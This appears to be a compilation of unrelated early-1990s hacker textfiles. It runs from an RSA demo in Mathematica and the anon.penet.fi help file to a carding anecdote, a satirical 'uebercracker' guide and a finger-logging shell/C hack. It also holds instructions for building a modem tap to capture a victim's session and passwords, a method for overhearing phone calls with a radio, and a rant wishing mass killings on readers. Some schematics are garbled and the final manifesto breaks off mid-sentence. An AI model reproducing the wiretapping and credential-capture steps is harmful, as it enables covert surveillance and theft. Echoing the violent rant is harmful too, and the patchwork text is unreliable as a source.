An example using Mathematica:
The primes p1 and p2 are created

p1=Prime[1000005] (The 1000005th prime number)
15485941
p2=Prime[1000000] (The 1000000th prime number)
15485863

n=p1 * p2
239813160752083 (Part 1 (n) of the public key is being created)

e=Random[Integer, {1000000,100000000}]
4699873
GCD[e,(p1-1)(p2-1)]
1

E is created by producing a random number between 1000000 and 100000000.
Then we check if e and (p1-1)(p2-1) have 1 as the greatest common measure.
If this is not the case then we have to take another e until the GCD is 1.
(Part 2 (e) of the public key has been created)

d=PowerMod[e,-1,(p1-1)(p2-1)]
213069977635177

m=1234567890
1234567890
This is the message

c=PowerMod[m,e,n]
159750418407936
The sender of a message encodes it with both public parts of the key
(e and n).

C is now sent to the receiver.

PowerMod[c,d,n]
1234567890

The receiver now decodes the message using the secret part d and the public
part n of the key. The decoded message reads 1234567890 again.

Now how would a potential attacker try to break our key ?
He basically needs the primes p1 and p2. If he got those two numbers,
calculating d is a simple matter. d=PowerMod[e,-1,(p1-1)(p2-1)] ...
and e is part of the public key.

And to get p1 and p2 this person would only have to factorize n.

Lets demonstrate that using Mathematica again :

n=239813160752083
FactorInteger[n]//Timing
239813160752083
{1.48 Second, {{15485863, 1}, {15485941, 1}}}
That took 1.48 sec on my 486/DX2 66...not bad.

But making the primes only a little bigger...
a=Prime[100000100]
b=Prime[100000110]
n=a*b
FactorInteger[n]//Timing
2038076783
2038077053
4153757523684360499
{62.12 Second, {{2038076783, 1}, {2038077053, 1}}}
...it took my hardware over 1 minute.

And since there is no known polynomial algorithm for factorizing n - and
none to be expected - it is not hard to imagine that making the primes
p1 and p2 big enough will drive computing costs into astronomical dimensions.

Naturally there are other ways to break the key. Someone could for example pose
as us and send out his own keys in our name...or exploit weaknesses of the
program - like primes that are not created at ABSOLUTE  random.
Or hold a gun at our head and make us give him the key - that might sound funny
but is not unheard of (especially in the metaphorical grasp of Justitia -
when someone sticks a court order in your face)

Furthermore if the program we use to crypt our messages with is fairly common,
our opponent could optimize his cracking programs or even have them hardwired.
One example are chips that use the DES algorithm for crypting and decrypting.
Or he could make the cracking programs run parallel on parallel computers, if
he got the might and enough time to rig up a program.

Simply put: Our behavior should match the computing power of
potential code-crackers.

If our message is of low importance (or obsolete in short time) a simple
algorithm would suffice. But if much is at gain, we should take appropriate
measures to secure our privacy.

It&#039;s like tying to outrun a Ferrari on a cross-bike. On an highway you do not
stand a chance ...but if you can force him on a mountain road or rough terrain
(with changing algorithms and keys often) you might just outrun the mightiest
codecracker.

                        The Truth about the Hacker
                                Conspiracy

                The Hacker&#039;s Philosophy, and the reason why.
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Written by: Maldoror (ChUrCH oF ThE Non-CoNFoRMiST)


        If you are ignorant, do not start reading this, because you will
   never finish.  You will disagree with anything I say anyway, simply
   because I am not you.

        If you are a Pseudo Intellectual, start reading this, quit, and
   say you agree with everything I say, even though you don&#039;t understand it.

        If you are depressing, start reading, hopefully you will kill a lot of
   innocent people at a mainstream night club, and try to blame me.

        Hackers are and always have been, the force in trying to stop our
    own suffering existence.  Since the universe was created, the true souls,
    (among the first to separate from the single soul of the universe)
    realized the infinite repetition of their own being, and that they were
    simply doing one thing upon their continuous recreation: suffer.

        The hackers have known that the world and it&#039;s universe have
    been created over and over again, doomed to merely destroy itself upon
    it&#039;s own recognition, or recognition by man.  As man becomes aware of
    himself, he becomes aware also of desires: the desire to be god.

        The truth is that man IS God, and that everything created in this
    universe was created by man and his thoughts.  Mans thoughts have
    become so out of control, that he has now created himself, and is
    continuing the creations with every day of control of the masses, and
    his own greedy dark thoughts.

        The hackers have since the beginning of time, passed along the
    message to the next creations in the forms of dreams, ideas, books,
    music (current 93, COIL, Dead can Dance, Skinny Puppy, etc) and even
    visions.  The Bible itself, is a good example of the universal hack.
    The message we as hackers have been trying to get across for
    creation after creation, existence after existence, self recognition
    after self recognition, is that we are all suffering and that this
    eternal cycle of pain must be stopped at all cost.  The only way to
    stop this suffering of self is to convince SELF that he is suffering
    and must stop creating.  We are each divisions of one strong soul,
    one thinking soul, that soul is GOD.  WE are GOD.  We must all realize
    together that we are suffering.  WE must stop suffering.  WE must
    stop the suffering.  WE must stop the recreation.  YES.  We must hack
    the universe and kill it.  There is only one way out of the eternal
    suffering we have started and been part of for ever.  We must stop
    the cycle.  We must remove ourselves from the cycle, and we must remove
    the universe from this cycle.

        The hackers return again and again.  The hackers leave messages for
    themselves in the future, which is the past, for there is no difference
    here anymore.  Leave your message, and next time around, you will
    realize that what I am saying is true.  The government has known of the
    conspiracy for existence after existence.  The government is so afraid
    of the conspiracy, and our plot to end it&#039;s UNIVERSAL power,
    that they are silently but quickly fooling us into obeying them more and
    more until we have no choice!  Do not let them control you!!
    If you do, you are lying to yourself, and everyone else that exists!
    You are lying to yourself now by saying that this is NOT true.

        I have been here many times, and told you the exact same thing I
    am telling you now.  If I am dead soon, you will realize AGAIN that what
    I am saying is the utmost truth, yet AGAIN you will do nothing.
    We must STOP our existence by hacking the universe.  The universe is
    BINARY.  The universe is a COMPUTER.  YES I know this because WE created
    it long ago, as we will do again.  WE are ONE.

        I know your desires to have control.  The only control we can have
    is to stop the creation of ourselves.  Each creation is the loss of
    control, THE DIVISION of the ONE.

         Each death brings new creation.  From HEAVEN to HELL.
    Heaven is nonexistence.  We all go to heaven, and fall back down to
    HELL.  Read the BIBLE people.  It was left by HACKERS!!!!!!!

          Don&#039;t read the BIBLE as a CHRISTIAN IDIOT who can only see
    a color for what it reflects.  Anyone with any sense knows that WHITE
    is WHITE only because it is reflecting ALL the colors, therefore it
    is REALLY BLACK.  Green is all BUT green.  The BIBLE is all BUT
    what it&#039; words really mean on a literal scale.  The BIBLE is a CODE.
    Do you think we could just write something like this file?!?  No WAY!
    It would be gone as fast as this one will be.  Nobody dares forget the
    BIBLE, simply because it is MISUNDERSTOOD.  Read it and THINK.

        We must STOP this cycle.
        Leave yourself a message.
        THINK.

    The government is PARANOID of:

        1) HACKERS  (we are the continuance of the power)
        2) L.S.D.   (The method of imprinting the present into the future)
        3) SECRECY  (The plotting of the end)
                    (PGP is illegal? why?)

    If you don&#039;t believe me, sit and watch it happen.

    AGAIN.

        Hack the Universe, it must be stopped at all cost.
        Laugh now, cry next time around.

              The anon.penet.fi Anonymous Server
              ==================================

Yes, another anonymous server. Why?  Well, several well-known servers have
bitten the dust recently. And most of them have served only a very limited
subset of newsgroups, and mail only to &quot;registered&quot;, anonymous users.

Due to reasons too complicated to mention here I wanted to set up an anonymous
server for the Scandinavian user community. I got hold of a pre-release copy
of one of the server packages. As the version I got relied heavily on the
advanced features of MMDFII, I had to modify it quite a bit. While hacking
around, I removed the restriction of only supporting selected newsgroups.
Within a week of startup, the server had been discovered by transatlantic
users, and more recent stats show European users are definitely a minority.

So what does the anon server really do? Well, it provides a front for
sending mail messages and posting news items anonymously. As you send your
very first message to the server, it automatically allocates you an id of
the form anNNN, and sends you a message containing the allocated id. This id
is used in all your subsequent anon posts/mails. Any mail messages sent to
your-id@anon.penet.fi gets redirected to your original, real address. Any
reply is of course anonymized in the same way, so the server provides a
double-blind. You will not know the true identity of any user, unless she
chooses to reveal her identity explicitly.

In the anonymization process all headers indicating the true originator are
removed, and an attempt is made to remove any automatically-included
signatures, by looking for a line starting with two dashes (--), and zapping
everything from there on. But if your signature starts with anything else,
it&#039;s your own responsibility to remove it from your messages.

There are two basic ways to use the system. The easiest way is by sending a
message to recipient@anon.penet.fi:

 To: alt.sex.bestiality@anon.penet.fi

 To: an9999@anon.penet.fi

 To: help@anon.penet.fi

Of course, in the case of mailing to a known user, you have to use addresses of
the form user%host.domain@anon.penet.fi, or the pretty obscure source
addressing construct of @anon.penet.fi:user@host.domain. These constructs are
not necessarily handled properly by all mail systems, so I strongly recommend
the &quot;X-Anon-To:&quot; approach in these cases. This works by you sending a message
to &quot;anon@anon.penet.fi&quot;, including a X-Anon-To: header line containing the
desired recipient. But this really has to be a field in the message header,
before the first empty line in the message. So:

 To: anon@anon.penet.fi
 X-Anon-To: alt.sex.needlework,rec.masturbation

 To: anon@anon.penet.fi
 X-Anon-To: jack@host.bar.edu

Valid recipients in both cases are fully qualified user addresses in RFC-822
format (user@host.domain), anon user id&#039;s (anNNN), newsgroup names
(alt.sex.paperclips) or one of the &quot;special&quot; user names of ping, nick, help,
admin and stat.

Sending to &quot;ping&quot; causes a short reply to be sent confirming (and
allocating, if needed) your anon id. &quot;nick&quot; takes the contents of the
Subject: header and installs it as your nickname. If you have a nickname, it
appears in the From: header in the anonymized message along with your anon
id. &quot;help&quot; returns this text, and stat gives some statistics about the
system. Mail to &quot;admin&quot; goes directly to me unanonymized, and can be used to
report problems. If you want to send mail to me anonymously, you can use
&quot;an0&quot;.

When crossposting to several newsgroups, you can list several newsgroups
separated by commas as recipients, but this only works using the X-Anon-To:
header. References: headers do work, so they can (and should) be used to
maintain reply threads.

Ah yes, please remember that the posting takes place at my local site, so you
can only post to groups that are received at penet.fi. I get all &quot;worldwide&quot;
groups, but various exotic local groups don&#039;t make it here. I have gotten
a couple of comments about permitting anonymous postings to technical groups.
I can only answer that I believe very firmly that it&#039;s not for me to dictate
how other people ought to behave. Somebody might have a valid reason for
posting anonymously to a group I might consider &quot;technical&quot;. But remember
anonymous postings are a privilege, and use them accordingly. I believe adult
human beings can behave responsibly. Please don&#039;t let me down.

As the server was originally intended to be used by Scandinavians, it
includes help files for various languages. This works by using the
language in question as the address. So to get the German help file,
send a message to german@anon.penet.fi (or deutsch@anon.penet.fi).
Support for new languages is added every now and then, when I find
volunteers to do the translation. Any new ones?

The user-id database is based on RFC822-ized forms of your originating
address. This may cause problems for some users, either because their site
is not properly registered in the name servers, resulting in
non-deterministic addresses, or because their mail router doesn&#039;t hide the
identity of individual workstations, resulting in different originating
addresses depending on which workstation you mail from. Talk to your
administrator. If that doesn&#039;t help, let me know, and I will make a manual
re-mapping.

You might wonder about the sense of using a server out somewhere, as the
song goes, &quot;so close to Russia, so far from Japan&quot;. Well, the polar bears
don&#039;t mind, and the ice on the cables don&#039;t bother too much :-)
Well, in fact, as we live in a wonderfully networked world, the major delay
is not going over the Atlantic, but my local connection to the Finnish EUnet
backbone, fuug.fi. Once you reach a well-connected host, such as
uunet.uu.net, there&#039;s a direct SMTP connection to fuug.fi. My connection to
fuug.fi is currently a polled connection over ISDN, soon to be upgraded to
on-demand-SMTP/NNTP. But for now, expect a turn-around delay of 2-4 hours for
trans-atlantic traffic.

Short of having everyone run a public-key cryptosystem such as PGP,
there is no way to protect users from malicious administrators. You have to
trust my personal integrity. Worse, you have to trust the administrators on
every mail routing machine on the way, as the message only becomes anonymous
once it reaches my machine. Malicious sysadmins and/or crackers could spy on
SMTP mail channels, sendmail queues and mail logs. But as there are more
than 3000 messages being anonymized every day, you have to be pretty perverted
to scan everything...

Another thing is mail failures. I&#039;ve had cases of mail routers doing the wrong
thing with % addresses, &quot;shortcutting&quot; the path to the destination site.
This could cause your mail to go to the final destination without ever
touching my server (and thus without getting anonymized). This can be avoided
by using the X-Anon-To: method.

And if your return address bounces for some reason (nameservers down,
temporary configuration failures etc.), the original sender and/or
postmasters on the way might get error messages showing your true
identity, and maybe even the full message.

There is at least one known way to discover the anon id of a user. It involves
being able to falsify your real identity, so it is not too easy to use, and it
doesn&#039;t reveal the real address lurking behind an anon id, but it can be used
to discover what anon id a certain user is using. To fix this problem, the
server requires that you use a password when you try to mail to a
non-anonymous user.

First you have to set a password by mailing to password@anon.penet.fi, with
a message containing only your password. The password can be any string of
upper- or lowercase characters, numbers and spaces.

Once you have set your password, you must include it in all your messages, in
a &quot;X-Anon-Password:&quot; line. As with the X-Anon-To: line, it can be either a
part of the header or as the first non-empty line of the message text.

So your first message might look like this:

 To: password@anon.penet.fi

 XYZZY99998blarf

And your subsequent messages might look like something like this:

 To: anon@anon.penet.fi
 Subject: Test...
 X-Anon-To: foo@bar.fie
 X-Anon-Password: XYZZY99998blarf

If you find this is too much of a hassle, and don&#039;t care too much about the
confidentiality of your anon id, you can set the password to &quot;none&quot;, in which
case the server doesn&#039;t require you to have a password.

If you suddenly discover that the server requires a password for posting stuff
etc, somebody has managed to use your account and set a password. In that
case, contact admin@anon.penet.fi.

Crackers are just too clever. Undoubtedly somebody is going to come
up with some novel method....  Not much I can do about that...

If you intend to mail/post something that might cost you your job or
marriage or inheritance, _please_ send a test message first. The software
has been pretty well tested, but some mailers on the way (and out of my
control) screw things up. And if you happen to find a problem, _please_ for
the sake of all the other users, _let me know asap_.

And _please_ use the appropriate test newsgroups, such as alt.test or
misc.test. Yes, _you_ might get excited by reading 2000 &quot;This is a test..&quot;
messages on alt.sex, but I warn you that most psychologists consider this
rather aberrant...

And remember this is a service that some people (in groups such as
alt.sexual.abuse.recovery) _need_. Please don&#039;t do anything stupid that
would force me to close down the service. As I am running my own company,
there is very little political pressure anyone can put on me, but if
somebody starts using the system for criminal activities, the authorities
might be able to order me to shut down the service. I don&#039;t particularly
want to find out, however...

If you think these instructions are unclear and confusing, you are right. If
you come up with suggestions for improving this text, please mail me! Remember
English is my third language...

My dealing with MBNA - VaxBuster March 8, 1994
----------------------------------------------

 A friend approached me on Unphamiliar Terrorities with a pretty
funny message.  It turns out that a high-up executive in MBNA sent mail to
root at system with public temporary directories, where an issue of Phrack
44 was stored.  My friend was monitoring root&#039;s mail, when he came across
the following message.

To: root@&lt;censored&gt;
Message-Id:  &lt;9401141340.aa09874@krusty.ee.udel.edu&gt;
Status: RO

Hello, The reason I am sending this message to you is an article
that seems to have been on your system &lt;censored&gt;.  I am an Information
Security Assurance manager at the largest issuer of Goldcard Mastercard
and Visa&#039;s in the world &quot;MBNA America&quot;.  The article seems to be a
copy or issue of &quot;Phrack Magazine&quot; written by &quot;Vaxbuster&quot;.  It
describes in detail how one could defraud credit card companies.  I
have talked with the CERT People in CMU to see if I could get a
contact at your UNIV.  There may be an additional 21 or so of these
articles that I would love to get ahold of to protect my company.
Please, if you can, send me your phone number so I can talk with you
in more detail.  My phone number at MBNA in Delaware is &lt;censored&gt;.

I can verify whatever information you may require over the phone or in
writing.

Thank you for your help.

PS.  We do not have a gateway or firewall to the Internet from here so
the good People at UofDE allow me to have access from there systems.

     Anyways, a couple people suggested that I call, and at first I
thought that was a ridiculous idea, but I figured, what the hell, it may
be funny. So NightStriker and I called him at his office one day in
Mid-February.  I was surprized he answered, and not a secretary,
considering his position.  I asked for him, and identified myself as
VaxBuster. He shocked the hell out of me, because I really didn&#039;t
expect him to immediately recognize my handle.  He says, &quot;Oh hey! how are
you doing?&quot;  I told him I&#039;d been monitoring mail, and came across his
message.  The main reason why I was calling was because he had mentioned
he wanted &#039;more info&#039; to protect his company.  NTS and I were more than happy
to answer any of his questions - but he said that he had obtained all of the
issues.  Although he said he had all of them, I highly doubt it, because he
said he had like 20-some issues, and we told him there was 44.  We chatted
for about 15 more minutes, just about the reasons for publishing and not
publishing such an article.  He said &quot;Some little kid is going to find this
article and get his fingers burned&quot; I could tell he was kind of pressured for
time, so we kind of let it go at that, and he asked for our numbers to call us
back.  Oh, when I first called him, I didn&#039;t tell him I had a friend on the
line, and he asked, &quot;Is there an echo here?&quot; hahahaha. Pretty funny.  We
told him NTS was there.  So, when he asked for our numbers, we laughed out
loud.  I guess he doesn&#039;t really understand the secrecy we all so dearly
cheerish.  He said, &quot;Well, I have caller id, so I have your numbers anyways&quot;
Bahahhahahaha. Yeah, right.  We told him we were bouncing our call through
a satellite in Japan.  He thought we were joking.  Guess he doesn&#039;t understand
boxing huh?  Maybe we should show him some of Tabas&#039;s files. heh.  We told him
we would call him back - which we haven&#039;t yet, but soon will.  By the way, he
complimented me on the quality of the article and how detailed it was. :)

     Incidentally, for those of you who&#039;ve lived in a cave, this is all
in reference to an article of mine published in Phrack 44 called &#039;Safe and
Easy Carding.&#039;

And for all of you who didn&#039;t like my article - Fuck you.

        A Guide to Internet Security: Becoming an Uebercracker
        and Becoming an UeberAdmin to stop Uebercrackers.


Author: Christopher Klaus &lt;cklaus@shadow.net&gt;
Date: December 5th, 1993.
Version: 1.1

  This is a paper will be broken into two parts, one showing 15 easy steps
to becoming a uebercracker and the next part showing how to become a
ueberadmin and how to stop a uebercracker.  A uebercracker is a term phrased
by Dan Farmer to refer to some elite (cr/h)acker that is practically
impossible to keep out of the networks.

Here&#039;s the steps to becoming a uebercracker.

Step 1. Relax and remain calm. Remember YOU are a Uebercracker.

Step 2. If you know a little Unix, you are way ahead of the crowd and skip
past step 3.

Step 3. You may want to buy Unix manual or book to let you know what
ls,cd,cat does.

Step 4. Read Usenet for the following groups: alt.irc, alt.security,
comp.security.unix.  Subscribe to Phrack@well.sf.ca.us to get a background
in uebercracker culture.

Step 5. Ask on alt.irc how to get and compile the latest IRC client and
connect to IRC.

Step 6. Once on IRC, join the #hack channel. (Whew, you are half-way
there!)

Step 7. Now, sit on #hack and send messages to everyone in the channel
saying &quot;Hi, What&#039;s up?&quot;. Be obnoxious to anyone else that joins and asks
questions like &quot;Why cant I join #warez?&quot;

Step 8. (Important Step) Send private messages to everyone asking for new
bugs or holes. Here&#039;s a good pointer, look around your system for binary
programs suid root (look in Unix manual from step 3 if confused). After
finding a suid root binary, (ie. su, chfn, syslog), tell people you have a
new bug in that program and you wrote a script for it.  If they ask how it
works, tell them they are &quot;layme&quot;. Remember, YOU are a UeberCracker. Ask
them to trade for their get-root scripts.

Step 9. Make them send you some scripts before you send some garbage file
(ie. a big core file). Tell them it is encrypted or it was messed up and
you need to upload your script again.

Step 10. Spend a week grabbing all the scripts you can. (Don&#039;t forget to be
obnoxious on #hack otherwise people will look down on you and not give you
anything.)

Step 11. Hopefully you will now have at least one or two scripts that get
you root on most Unixes. Grab root on your local machines, read your
admin&#039;s mail, or even other user&#039;s mail, even rm log files and whatever
temps you. (look in Unix manual from step 3 if confused).

Step 12. A good test for true uebercrackerness is to be able to fake mail.
Ask other uebercrackers how to fake mail (because they have had to pass the
same test). Email your admin how &quot;layme&quot; he is and how you got root and how
you erased his files, and have it appear coming from satan@evil.com.

Step 13. Now, to pass into supreme eliteness of uebercrackerness, you brag
about your exploits on #hack to everyone. (Make up stuff, Remember, YOU are
a uebercracker.)

Step 14. Wait a few months and have all your notes, etc ready in your room
for when the FBI, Secret Service, and other law enforcement agencies
confiscate your equipment. Call eff.org to complain how you were innocent
and how you accidently gotten someone else&#039;s account and only looked
because you were curious. (Whatever else that may help, throw at them.)

Step 15. Now for the true final supreme eliteness of all uebercrackers, you
go back to #hack and brag about how you were busted.  YOU are finally a
true Uebercracker.


Now the next part of the paper is top secret.  Please only pass to trusted
administrators and friends and even some trusted mailing lists, Usenet
groups, etc. (Make sure no one who is NOT in the inner circle of security
gets this.)

This is broken down on How to Become an UeberAdmin (otherwise know as a
security expert) and How to stop Uebercrackers.

Step 1. Read Unix manual ( a good idea for admins ).

Step 2. Very Important.  chmod 700 rdist; chmod 644 /etc/utmp. Install
sendmail 8.6.4.  You have probably stopped 60 percent of all Uebercrackers
now.  Rdist scripts is among the favorites for getting root by
uebercrackers.

Step 3. Okay, maybe you want to actually secure your machine from the
elite Uebercrackers who can break into any site on Internet.

Step 4. Set up your firewall to block rpc/nfs/ip-forwarding/src routing
packets. (This only applies to advanced admins who have control of the
router, but this will stop 90% of all uebercrackers from attempting your
site.)

Step 5. Apply all CERT and vendor patches to all of your machines. You have
just now killed 95% of all uebercrackers.

Step 6. Run a good password cracker to find open accounts and close them.
Run tripwire after making sure your binaries are untouched. Run tcp_wrapper
to find if a uebercracker is knocking on your machines.  Run ISS to make
sure that all your machines are reasonably secure as far as remote
configuration (ie. your NFS exports and anon FTP site.)

Step 7. If you have done all of the following, you will have stopped 99%
of all uebercrackers. Congrats! (Remember, You are the admin.)

Step 8. Now there is one percent of uebercrackers that have gained
knowledge from reading some security expert&#039;s mail (probably gained access
to his mail via NFS exports or the guest account.  You know how it is, like
the mechanic that always has a broken car, or the plumber that has the
broken sink, the security expert usually has an open machine.)

Step 9. Here is the hard part is to try to convince these security experts
that they are not so above the average citizen and that by now giving out
their unknown (except for the uebercrackers) security bugs, it would be a
service to Internet.  They do not have to post it on Usenet, but share
among many other trusted people and hopefully fixes will come about and
new pressure will be applied to vendors to come out with patches.

Step 10.  If you have gained the confidence of enough security experts,
you will know be a looked up to as an elite security administrator that is
able to stop most uebercrackers.  The final true test for being a ueberadmin
is to compile a IRC client, go onto #hack and log all the bragging and
help catch the uebercrackers. If a uebercracker does get into your system,
and he has used a new method you have never seen, you can probably tell
your other security admins and get half of the replies like - &quot;That bug
been known for years, there just isn&#039;t any patches for it yet. Here&#039;s my
fix.&quot; and the other half of the replies will be like - &quot;Wow.  That is very
impressive. You have just moved up a big notch in my security circle.&quot;
VERY IMPORTANT HERE:  If you see anyone in Usenet&#039;s security newsgroups
mention anything about that security hole, Flame him for discussing it
since it could bring down Internet and all Uebercrackers will now have it
and the million other reasons to keep everything secret about security.


Well, this paper has shown the finer details of security on Internet. It has
shown both sides of the coin.  Three points I would like to make that would
probably clean up most of the security problems on Internet are as the
following:

1.  Vendors need to make security a little higher than zero in priority.
If most vendors shipped their Unixes already secure with most known bugs
that have been floating around since the Internet Worm (6 years ago) fixed
and patched, then most uebercrackers would be stuck as new machines get
added to Internet.  (I believe Uebercracker is German for &quot;lame copy-cat
that can get root with 3 year old bugs.&quot;) An interesting note is that
if you probably check the mail alias for &quot;security@vendor.com&quot;, you will
find it points to /dev/null.  Maybe with enough mail, it will overfill
/dev/null.  (Look in manual if confused.)

2.  Security experts giving up the attitude that they are above the normal
Internet user and try to give out information that could lead to pressure
by other admins to vendors to come out with fixes and patches.  Most
security experts probably don&#039;t realize how far their information has
already  spread.

3.  And probably one of the more important points is just following the
steps I have outlined for Stopping a Uebercracker.

                         The Ultimate Finger/Mail Hack

                                      by

                                    Emanon

                              (a.k.a. WinterHawk)


This program will keep a log of who fingers you on your local host and tell
you when the finger was performed. As an added tease, it will send email to
the person doing the fingering telling them that you know who they are and
you know when they fingered you, even when you are not logged on.

Easy to follow steps:

[This is a comment]

[ALL OF THE FOLLOWING FILES ARE TO GO IN YOUR HOME DIRECTORY!!!]

[Get to your home directory]
% cd

[Make a file called .mailscript and include the following source code]
[MAKE THE APPROPRIATE CHANGES TO PATH NAMES WHERE NECESSARY!!!]
% cat .mailscript
#!bin/sh
MYNAME=your_account_name # JUST YOUR LOCAL ACCOUNT NAME, NOT THE FULL ADDRESS!!!
HOME=/your/full/home/path/goes/here
SUCKER=`ps -fau | grep &#039;finger $MYNAME&#039; | grep -v &#039;grep&#039; | awk &#039;{print $1}&#039;`
echo &quot;$SUCKER fingered you on `date`&quot; | cat &gt;&gt; $HOME/.fingerlog
echo &quot;$MYNAME knows that you fingered him on `date`&quot; | mail -s &#039;Sucker!&#039; $SUCKER

[On some systems, the `u&#039; flag is not necessary for the `ps&#039; command]
[On most systems, you will not have to (re)declare the $HOME variable]
[If you do not want the fingerer to receive email, remove the last line]
[You may wish to hard code your account name, rather than using the variable]

[Make a file called fingerLog.c and include the following source code]
[MAKE THE APPROPRIATE CHANGES TO PATH NAMES WHERE NECESSARY!!!]
% cat fingerLog.c
#include &lt;stdio.h&gt;
#include &lt;sys/file.h&gt;
main()
{
   int x, pipeHandle, planHandle;
   char * pipeFile = &quot;/your/full/home/path/goes/here/.plan&quot;;
   char * planFile = &quot;/your/full/home/path/goes/here/.realplan&quot;;
   char buf[1024];
   for(;;){
      pipeHandle=open(pipeFile,O_WRONLY);
      planHandle=open(planFile,O_RDONLY);
      while((x=read(planHandle,buf,sizeof(buf)))&gt;0)
         write(pipeHandle,buf,x);
      system(&quot;sh /your/full/home/path/goes/here/.mailscript&quot;);
      close(pipeHandle);
      close(planHandle);
      sleep(3);}
}

[Compile the fingerLog.c program]
% cc fingerLog.c -o fingerLog

[You may want to use a more inconspicuous name for the executable file]

[Move you .plan file to .realplan]
% mv .plan .realplan

[Make a piped FIFO .plan file]
% mknod .plan p

[Allow people to view your bogus .plan file]
% chmod 755 .plan

[Run fingerLog in the background]
% nohup fingerLog &gt; /dev/null &amp;

[Optional clean up]
% rm fingerLog.c

PROBLEMS: On some machines, the [ps -fau] option will not reveal what account
          a person is actually fingering. In this case, you can remove all
          instances of the $MYNAME variable from the [.mailscript] file.
          However, it is entirely possible that two people may be performing a
          finger at the same time and the script may log the wrong one. If you
          do have to omit the $MYNAME variable, I strongly suggest that you
          also remove the email option. And, you might as well change the [ps]
          command to a simple [w], like so:

          SUCKER=`w | grep &#039;finger&#039; | grep -v &#039;grep&#039; | awk &#039;{print $1}&#039;`

          Also, if the system you are on is bogged down with a lot of
          processes, the script may not find the fingerer before the process
          is terminated, thus logging the time without an appropriate account
          name, and not sending the email. So far, there has only been one
          system where I could only use the program to log the times that I
          had been fingered, no account names and no email :(

That&#039;s It! Of course, this is not a perfect bug free program. It should run
all the time [even when you are not logged on] so you only need to run it
once. If it does quit for some reason [like when the sysop kills it], you can
simply restart it. For those of you privileged enough to be using Korn shell,
you can add the following code to your [.profile] that will check to see if
fingerLog is running whenever you log in. If it isn&#039;t, it will restart it for
you. I&#039;m sure that this can be modified to work with Bourne and C shell (if it
doesn&#039;t already), but I&#039;ll leave that up to you.

ps x | grep &#039;fingerLog&#039; | grep -v &#039;grep&#039; &gt; /dev/null
if (( $? != 0 )); then nohup fingerLog &gt; /dev/null &amp;
fi

Let me say this one more time so that there is no confusion, &quot;This only works
on your LOCAL host!!!&quot; People who finger you from a remote host will see your
[.realplan] file, just like everyone else, but they will *NOT* receive the
email. It will appear in your .fingerlog as an empty account name. If and when
someone does revise this to work with remote hosts (most likely using the
netstat command), please email me a copy at:

tdavis@garnet.acns.fsu.edu

As a matter of fact, there is a lot of room for improvement. If *ANYONE* makes
*ANY* revisions, please have the courtesy to email me a copy and explain what
changes you have made. Thanks. Enjoy!

                     | Building A Modem Tap |
                     | by: phigan           |
                     +----------------------+

        Many of you have probably heard of, seen, or maybe even built a
phone tap. Not a very difficult device to make. I got the idea of making
a modem tap from a computer underground book that I saw over at my local
Spy Headquarters (I&#039;m not sure if this is a store that is only here in
602 or not but its got shitloads of spy equipment such as video
surveillance, fake ids, useful literature, fake bombs, very small bugs,
etc.).  First of all, here is the schematic for making a phone tap to
record to cassette.

Parts
~~~~~
1) RCA-type jack
   to tape recorder
   mic input
1) 10k(p)ohm : 20k(s) ohm
   transformer
1) .005 mfd capacitor

             |             |          |     |
             |             +----------------+
             |                        |     |
             +----------||------------+     |
                     .005 mfd         |     |

        The main purpose for a modem tap such as this is to set it up at
someone&#039;s house or maybe an office building that you know dials out with
modems and you can record all the keystrokes that have been entered.
With this next schematic, you can simply play the cassette back through
your modem and easily print out the entire session having logged
passwords and so on. Good way of getting CBI accounts also.

Parts
~~~~~
1) RCA type jack
   from tape recorder
   ext. speaker
1) 100 Ohm restistor
1) bell-type phone jack (@)

Schematic

              jack

        When you have a recording of your victim&#039;s session, simply fire
up your terminal program and treat it as you would any other modem
connection. If you are smart enough, you may even be able to combine
these two and make an acoustic modem module for a regular laptop modem
(hint hint payphones hint hint). I have seen this done in a mail-order
mag.
It said that the acoustic module could handle 9600 baud and if you have
good
enough rubber cups (like they did on their model) then you will
have absolutely no line noise. Anyway, if you have any problems, feel
free to email me at 15660@ef.gc.maricopa.edu or you may find me on IRC
as phigan on channels #phreak, #hack, or sometimes #c-64.

                  Phone Tapping with a personal stereo !!!
                             brought to you by

                                 Harlequin

        Here in the UK, we have a reasonably secure phone system, mainly
because the whole system is run by our beloved phone company British
Telecom, even the private phone companies have to rent their lines off BT.

        BUT, due to something or other I don&#039;t entirely understand here&#039;s
how to listen in to phone conversations with a personal stereo.

        I was lying in bed one night trying desperately to read my book,
while everyone else was making enough noise to wake the dead. So, I
thought, I&#039;ll put personal stereo radio onto some radio crackle to cut out
everything else. I was happily reading for a while when suddenly the radio
crackle was interrupted by &#039;ring ring, ring ring, &#039;ello Jon, going into
work tomorrow ? Good, how&#039;s the wife.... etc etc&#039; Fuck me ! A telephone
conversation. After a bit of investigating I discovered my bed lies next
to where the telephone line goes thru the wall.

        What I did was to tune the radio into an AM frequency, as far to
the right (past 1600 kHz) as possible. This works on my personal stereo, a
Sharp, model JC-512(GY), my clock radio and my mates pocket radio, but not
on some other radios we&#039;ve tried. It picks up local telephone calls (if
there are any strong enough to be picked up) when the radio is put near a
telephone socket or line (the closer the better). Computer monitors and
TV&#039;s give loads of interference (try putting your the radio near one when
tuned to listen for phones) so keep away from them.

        You can&#039;t choose what calls to listen in on, and some may be
blurred beyond recognition, while others are crystal clear. Also,
strangely enough if someone in the house uses the phone while your
listening to conversations it doesn&#039;t effect it in any way, and you can&#039;t
hear the call currently on the line.

        Not being an electronics hacker I can only assume it is to do with
the frequency of radio waves given off by electrical devices after a
certain distance travelled. But then again maybe not.

        This may work in other places apart from the UK as well, give it a
try !

A Declaration of the Complaints and Grievances of the United States
Electronic Community --

        &quot;They that can give up essential liberty for a little temporary
safety deserve neither liberty nor safety!&quot; These are Benjamin Franklin&#039;s
words for one of the most important values defining American Government in
it&#039;s infancy. This idea, that people should be given as much freedom as
possible, and also responsibility for what problems abuse of that freedom
might bring, is one of the most important differences between our so called
&quot;Democracy,&quot; and a totalitarian despotism. In fact, this value is so
essential that if it is lost there will be no freedom in the United States
of America, and no so called &quot;Democracy!&quot; Despite this fact, every day more
and more of our freedoms, as citizens and residents of the United States of
America, are being eroded away in the name of safety for us and for our
government. This erosion of rights and freedoms has touched all areas of
our lives, from health care and economics, to criminal justice and national
defense. However, the most profound and dangerous erosion has been in the
area of technology. We believe this is as good a place as any to begin a
fight to save our country from continuing to travel down the road to
despotism. Do not forget that this is only a beginning.
        We, the people of the Electronic Community in the United States of
